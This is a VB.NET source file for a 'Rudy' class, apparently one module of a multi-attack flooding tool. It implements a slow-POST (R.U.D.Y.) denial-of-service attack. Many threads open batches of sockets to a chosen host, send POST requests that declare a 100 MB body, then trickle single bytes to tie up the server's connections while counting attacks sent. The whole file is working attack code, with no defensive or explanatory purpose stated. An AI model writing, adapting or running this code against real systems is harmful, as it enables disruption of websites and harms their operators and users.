Imports System.Net
Imports System.Net.Sockets
Imports System.Text
Imports System.Threading

Public Class Rudy
    Private ThreadsEnded = 0
    Private PostDATA As String
    Private HostToAttack As String
    Private TimetoAttack As Integer
    Private ThreadstoUse As Integer
    Private Ports As Integer
    Private Threads As Thread()
    Private AttackRunning As Boolean = False
    Private Attacks As Integer = 0
    Private RandomFile As Boolean
    Public Sub New(ByVal model As RudyModel)
        If Not AttackRunning = True Then
            AttackRunning = True
            HostToAttack = model.Host
            Ports = model.Port
            ThreadstoUse = model.ThreadstoUse
            TimetoAttack = model.Time
            PostDATA = model.PostDATA
            If HostToAttack.Contains("http://") Then HostToAttack = HostToAttack.Replace("http://", String.Empty)
            If HostToAttack.Contains("www.") Then HostToAttack = HostToAttack.Replace("www.", String.Empty)
            If HostToAttack.Contains("/") Then HostToAttack = HostToAttack.Replace("/", String.Empty)


            Threads = New Thread(ThreadstoUse - 1) {}
            GetFloodsBase().SetMessage("RUDY attack")
            For i As Integer = 0 To ThreadstoUse - 1
                Threads(i) = New Thread(AddressOf DoWork)
                Threads(i).IsBackground = True
                Threads(i).Start()
            Next

        Else

            GetFloodsBase().SetMessage("An Rudy Attack is Already Running on " & HostToAttack)
        End If

    End Sub

    Private Sub Ended()

        ThreadsEnded = ThreadsEnded + 1
        If ThreadsEnded = ThreadstoUse Then
            ThreadsEnded = 0
            ThreadstoUse = 0
            AttackRunning = False
            GetFloodsBase().SetMessage("Rudy Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & Attacks.ToString)
            Attacks = 0

        End If

    End Sub

    Public Sub StopRudy()
        If AttackRunning = True Then
            For i As Integer = 0 To ThreadstoUse - 1
                Try
                    Threads(i).Abort()
                Catch
                End Try
            Next
            AttackRunning = False

            GetFloodsBase().SetMessage("Rudy Attack on " & HostToAttack & " aborted successfully. Attacks Sent: " & Attacks.ToString)
            Attacks = 0

        Else
            GetFloodsBase().SetMessage("Rudy Attack:, Not Running!")
        End If
    End Sub
    Public Function GenerateRandomString(ByRef len As Integer, ByRef upper As Boolean) As String
        Dim rand As New Random()
        Dim allowableChars() As Char = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLOMNOPQRSTUVWXYZ0123456789".ToCharArray()
        Dim final As String = String.Empty
        For i As Integer = 0 To len - 1
            final += allowableChars(rand.Next(allowableChars.Length - 1))
        Next

        Return IIf(upper, final.ToUpper(), final)
    End Function
    Private Sub DoWork()
        Dim file As String = ""
        Try
            Dim socketArray As Socket() = New Socket(100 - 1) {}
            Dim span As TimeSpan = TimeSpan.FromSeconds(CDbl(TimetoAttack))
            Dim stopwatch As Stopwatch = Stopwatch.StartNew
            Do While (stopwatch.Elapsed < span)
                Try
                    Dim i As Integer

                    For i = 0 To 100 - 1
                        If RandomFile Then
                            file = GenerateRandomString(5, True)
                        End If
                        socketArray(i) = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                        socketArray(i).Connect(Dns.GetHostAddresses(HostToAttack), Ports)
                        Dim HttpString = "POST /" & file & " HTTP/1.1" & ChrW(13) & ChrW(10) & "Host: " & HostToAttack.ToString() & ChrW(13) & ChrW(10) & "Connection: keep-alive" & ChrW(13) & ChrW(10) & "Content-length: 100000000" & ChrW(13) & ChrW(10) & ChrW(13) & ChrW(10)
                        socketArray(i).Send(ASCIIEncoding.Default.GetBytes(HttpString))

                        Attacks = Attacks + 1
                        GetFloodsBase().Set_AttackUpStrengOnByte(Attacks * HttpString.Length)

                    Next i
                    Dim j As Integer
                    For j = 0 To Attacks
                        Dim bytes As Integer = 0
                        Dim sb = New StringBuilder()
                        Dim bytesReceived As Byte() = New Byte(255) {}

                        Do
                            bytes = socketArray(j).Receive(bytesReceived, bytesReceived.Length, 0)
                            sb.Append(Encoding.ASCII.GetString(bytesReceived, 0, bytes))
                        Loop Until bytes > 0

                        GetFloodsBase().Set_AttackDownStrengOnByte(Attacks * sb.ToString().Length)

                        socketArray(j).Send("A")

                    Next j
                    Continue Do

                Catch

                    Continue Do
                End Try
            Loop
        Catch : End Try
        Ended()
    End Sub
End Class
